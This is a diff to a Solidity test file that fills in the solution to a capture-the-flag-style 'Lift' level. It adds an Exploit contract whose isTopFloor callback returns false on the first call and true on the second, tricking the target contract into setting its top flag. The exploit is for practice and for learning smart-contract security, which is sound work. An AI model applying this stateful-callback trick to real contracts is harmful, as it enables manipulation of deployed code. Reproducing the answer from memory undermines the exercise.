@@ -16,12 +16,37 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Exploit exploit = new Exploit(address(instance));
 
-        checkSuccess();
+        exploit.attack();
+
+
+    checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(instance.top(), "Solution is not solving the level");
+    }
+}
+
+contract Exploit is House {
+    Lift public lift;
+    bool public firstCall = true;
+
+    constructor(address _liftAddress) {
+        lift = Lift(_liftAddress);
+    }
+
+    function isTopFloor(uint256 ) external override returns (bool) {
+        if (firstCall) {
+            firstCall = false;
+            return false;
+        } else {
+            return true;
+        }
+    }
+
+    function attack() public {
+        lift.goToFloor(1);
     }
 }
